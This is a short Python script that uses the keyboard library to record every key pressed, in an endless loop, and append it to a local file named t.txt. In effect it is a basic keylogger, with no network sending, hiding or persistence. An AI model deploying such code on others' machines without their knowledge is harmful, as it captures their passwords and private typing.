import keyboard
import time

while True:
    key = keyboard.read_key()
    
    if key:
        with open('t.txt', "a", encoding='utf-8') as f:
            time.sleep(0.06)
            data = key
            f.write(data)
        
    # while True:        
    #     with open('t.txt', "r", encoding='utf-8') as f:
    #         main = f.read()
    #         f.close()